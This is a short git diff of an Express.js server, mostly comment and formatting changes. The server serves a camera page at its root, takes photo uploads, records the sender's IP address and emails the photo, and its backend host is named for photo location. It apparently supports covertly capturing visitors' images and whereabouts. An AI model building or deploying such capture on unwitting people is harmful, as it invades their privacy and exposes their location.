@@ -9,6 +9,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const uploadPath = "uploads/";
 
+// Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.static(uploadPath));
@@ -18,7 +19,7 @@ if (!fs.existsSync(uploadPath)) {
   fs.mkdirSync(uploadPath);
 }
 
-// Multer storage setup
+// Multer setup
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, uploadPath),
   filename: (req, file, cb) =>
@@ -35,17 +36,17 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-// 🔹 Serve camera.html when user opens root "/"
+// Serve camera.html on root "/"
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "camera.html"));
 });
 
-// 🔹 Upload route (handles photo + Gmail)
+// Upload Route
 app.post("/upload", upload.single("photo"), async (req, res) => {
   try {
     if (!req.file) return res.status(400).json({ error: "No file uploaded" });
 
-    const backendUrl = 'https://backend-photo-loaction.onrender.com/upload';
+    const backendUrl = "https://backend-photo-loaction.onrender.com";
     const photoURL = `${backendUrl}/${req.file.filename}`;
 
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
@@ -74,17 +75,20 @@ app.post("/upload", upload.single("photo"), async (req, res) => {
 
     await transporter.sendMail(mailOptions);
     console.log("✅ Email sent successfully!");
+
     res.json({
       message: "✅ Photo uploaded & email sent successfully!",
       filePath: photoURL,
     });
   } catch (error) {
     console.error("❌ Error:", error);
-    res.status(500).json({ error: "Something went wrong", details: error.message });
+    res.status(500).json({
+      error: "Something went wrong",
+      details: error.message,
+    });
   }
 });
 
-// Start server
 app.listen(PORT, () => {
   console.log(`✅ Server running at http://localhost:${PORT}`);
 });
